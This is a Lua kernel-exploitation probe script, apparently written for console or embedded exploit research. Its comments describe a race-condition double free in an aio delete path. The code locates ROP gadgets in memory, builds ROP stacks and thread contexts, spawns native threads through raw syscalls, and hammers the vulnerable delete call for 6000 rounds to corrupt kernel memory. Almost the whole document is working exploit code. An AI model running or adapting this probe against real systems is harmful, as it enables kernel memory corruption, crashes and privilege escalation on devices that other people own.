-- CRASH_CLASS: HIGH
-- PROBE 717a: a long delete hammer, with the C double free as the target.
--
-- Context: the count-1 delete path reads its context C = [W+0x18] at
-- 8ad6feb7, tests it at 8ad6fec3, drops C->[+0x10] and frees C at 8ad6fee8,
-- and only then clears the field at 8ad6fef5. A second caller that re-looks-up
-- the same id inside those fifteen instructions still sees a live C and frees
-- it again -> the credited object behind C+0x10 is released twice.
--
-- A status of 0 cannot show this: a miss and an already-cleared C both return
-- 0. What a C double free does show is the second free of the object at
-- C+0x10, which the allocator answers with corruption or a panic.
--
-- Four native children loop the delete with RDI pointing at one shared id word;
-- the parent publishes a fresh live id as fast as it can. The probe counts
-- rounds, checks liveness every 500 rounds, and keeps going to 6000.

print("=== PROBE 717a: long aio delete hammer ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] trampoline=0x" .. string.format("%X", fn) .. " pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rsp = find_pat(ebase, 0x494000, string.char(0x5C,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not pop_rax or not pop_rsp or not jmp_g then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local C = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
           RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local id_page = mmap(page)
local KIDS = 4
local kids = 0
for k=1,KIDS do
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rax))
    wq(base+8,  uint64(662))
    wq(base+16, uint64(fn))
    wq(base+24, uint64(pop_rsp))
    wq(base+32, uint64(base))
    local stat = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+C.MAGIC, uint64(0x480))
    wq(ctx+C.TYPE, uint64(0x10000))
    wq(ctx+C.CS, uint64(0x43))
    wq(ctx+C.SS, uint64(0x3B))
    wq(ctx+C.RIP, uint64(fn))
    wq(ctx+C.RSP, uint64(base))
    wq(ctx+C.RDI, uint64(id_page))
    wq(ctx+C.RSI, uint64(1))
    wq(ctx+C.RDX, uint64(stat))
    wq(ctx+C.RAX, uint64(662))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    if ok then kids = kids + 1 end
end
print(string.format("[A] children=%d", kids))
if kids == 0 then return end

local data = mmap(page)
local outid = mmap(page)
local pout = mmap(page)
local ts = memory.alloc(16)
wq(ts, 0); wq(ts+8, 250000)
local ROUNDS = 6000
local created, beaten = 0, 0
local t0 = os.time and os.time() or 0
for i=1,ROUNDS do
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(outid)) end)
    if ok1 and to_num(rv1) == 0 then
        created = created + 1
        wd(id_page, rd(outid) or 0)
        pcall(function() mk(664)(uint64(outid), uint64(1), uint64(pout)) end)
        -- a child almost always wins; the parent's own delete only proves the loss
        local s = mmap(page)
        wd(s, 0x77777777)
        local ok2, rv2 = pcall(function() return mk(662)(uint64(outid), uint64(1), uint64(s)) end)
        if ok2 and to_num(rv2) == 0 and (rd(s) or 0) ~= 0 then beaten = beaten + 1 end
    end
    if i % 500 == 0 then
        print(string.format("[B] round %d created=%d beaten=%d alive=%d", i, created, beaten,
            to_num(native.fcall_with_rax(fn_ud, 20))))
    end
end
wd(id_page, 0x7FFFFFFF)
print(string.format("[C] done rounds=%d created=%d beaten=%d alive=%d", ROUNDS, created, beaten,
    to_num(native.fcall_with_rax(fn_ud, 20))))

-- health after the storm: create, poll, delete must still work
local bad = 0
for n=1,8 do
    local o = mmap(page)
    local p = mmap(page)
    local s = mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(o), uint64(1), uint64(p)) end)
    wd(s, 0x77777777)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(s)) end)
    local st = rd(p) or 0
    if not (ok1 and ok2 and ok3 and to_num(rv1)==0 and to_num(rv2)==0 and to_num(rv3)==0 and st==3 and (rd(s) or 0)==0) then
        bad = bad + 1
        print(string.format("    health %d: rv=%s/%s/%s poll=%08X status=%08X", n,
            tostring(to_num(rv1)), tostring(to_num(rv2)), tostring(to_num(rv3)), st, rd(s) or 0))
    end
end
print(string.format("[D] health bad=%d/8 alive=%d", bad, to_num(native.fcall_with_rax(fn_ud, 20))))
